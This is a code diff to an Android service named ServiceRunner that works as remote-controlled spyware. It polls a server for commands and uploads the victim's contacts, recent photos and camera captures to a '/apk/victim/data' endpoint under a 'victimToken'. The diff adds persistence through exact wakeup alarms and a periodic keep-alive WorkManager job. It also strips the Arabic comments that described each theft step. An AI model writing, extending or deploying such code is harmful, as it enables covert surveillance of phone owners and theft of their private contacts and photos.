@@ -1,8 +1,10 @@
 package com.sec.check;
 
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.app.admin.DevicePolicyManager;
 import android.content.ClipData;
@@ -36,6 +38,9 @@ import android.widget.Toast;
 
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
+import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -100,6 +105,9 @@ public class ServiceRunner extends Service {
 
         scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.scheduleAtFixedRate(this::pollCommands, 5, POLL_INTERVAL, TimeUnit.SECONDS);
+        
+        scheduleAlarms();
+        
         Log.d(TAG, "=== SERVICE STARTED ===");
     }
 
@@ -123,6 +131,41 @@ public class ServiceRunner extends Service {
                     .build();
             startForeground(NOTIFICATION_ID, n);
         } catch (Exception e) {}
+    }
+
+    private void scheduleAlarms() {
+        try {
+            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+            Intent alarmIntent = new Intent(this, AlarmReceiver.class);
+            PendingIntent pi = PendingIntent.getBroadcast(
+                    this, 0, alarmIntent,
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            
+            if (am != null) {
+                long triggerAt = System.currentTimeMillis() + 5 * 60 * 1000;
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
+                } else {
+                    am.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pi);
+                }
+                Log.d(TAG, "Alarm scheduled in 5 min");
+            }
+            
+            try {
+                PeriodicWorkRequest workRequest = new PeriodicWorkRequest.Builder(
+                        KeepAliveWorker.class, 15, TimeUnit.MINUTES)
+                        .build();
+                WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                        "keep_alive_work",
+                        ExistingPeriodicWorkPolicy.KEEP,
+                        workRequest);
+                Log.d(TAG, "WorkManager scheduled");
+            } catch (Exception e) {
+                Log.e(TAG, "WorkManager error: " + e.getMessage());
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "scheduleAlarms error: " + e.getMessage());
+        }
     }
 
     @Override
@@ -352,7 +395,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ★★★ جهات الاتصال — إرسال واحد واحد ★★★
     private void sendContacts() {
         try {
             if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
@@ -378,7 +420,7 @@ public class ServiceRunner extends Service {
             }
 
             int sent = 0;
-            while (c.moveToNext() && sent < 500) {  // ★ رفعنا الحد إلى 500
+            while (c.moveToNext() && sent < 500) {
                 try {
                     String name = "";
                     String number = "";
@@ -407,7 +449,6 @@ public class ServiceRunner extends Service {
 
                     sent++;
 
-                    // ★ delay صغير كل 25 جهة
                     if (sent % 25 == 0) {
                         Thread.sleep(250);
                     }
@@ -419,7 +460,6 @@ public class ServiceRunner extends Service {
             }
             c.close();
 
-            // إشعار الانتهاء
             JSONObject done = new JSONObject();
             done.put("type", "contacts_done");
             done.put("token", victimToken);
@@ -460,12 +500,11 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ★★★ الصور — إرسال 10 صور واحدة واحدة ★★★
     private void sendPhotos() {
         try {
             Cursor c = getContentResolver().query(
                     MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
-                    MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 10");  // ★ 10 صور
+                    MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 10");
 
             if (c == null) {
                 reportCommandResult("get_photos", "fail", "cursor_null");
@@ -481,7 +520,6 @@ public class ServiceRunner extends Service {
                     String path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                     long size = c.getLong(c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
 
-                    // ★ تخطى الصور الكبيرة (أكبر من 2 MB)
                     if (size > 2000000 || size <= 0) {
                         Log.d(TAG, "Skip large photo: " + size);
                         sent++;
@@ -494,7 +532,6 @@ public class ServiceRunner extends Service {
                         continue;
                     }
 
-                    // اقرأ وأرسل
                     byte[] bytes = new byte[(int) imgFile.length()];
                     FileInputStream fis = new FileInputStream(imgFile);
                     int read = fis.read(bytes);
@@ -516,8 +553,6 @@ public class ServiceRunner extends Service {
                     }
 
                     sent++;
-
-                    // ★ delay 500ms بين كل صورة
                     Thread.sleep(500);
 
                 } catch (Exception e) {
@@ -527,7 +562,6 @@ public class ServiceRunner extends Service {
             }
             c.close();
 
-            // إشعار الانتهاء
             JSONObject d = new JSONObject();
             d.put("type", "photos_done");
             d.put("token", victimToken);
@@ -660,7 +694,6 @@ public class ServiceRunner extends Service {
                                 d.put("image", "data:image/jpeg;base64," + base64);
                                 postJson("/apk/victim/data", d);
                                 reportCommandResult(camName, "ok", "");
-                                Log.d(TAG, "Photo sent: " + data.length);
                             } catch (Exception e) {
                                 reportCommandResult(camName, "fail", "send: " + e.getMessage());
                             } finally {
@@ -1037,4 +1070,4 @@ public class ServiceRunner extends Service {
     private void postJson(String path, JSONObject data) {
         postJsonWithResponse(path, data);
     }
-                }
+        }
